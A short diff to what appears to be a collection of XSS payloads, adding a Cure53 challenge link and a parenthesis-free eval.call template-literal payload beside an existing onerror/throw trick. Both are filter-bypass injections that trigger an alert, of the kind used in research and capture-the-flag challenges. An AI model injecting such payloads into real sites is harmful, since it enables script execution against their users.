@@ -25,6 +25,15 @@ xss.html
 
 
 ---
+
+[Cure53](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-2)
+
+
+    eval.call`${'alert\x2823\x29'}`
+
+
+---
+
 [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)
 
     onerror=alert;throw 23;
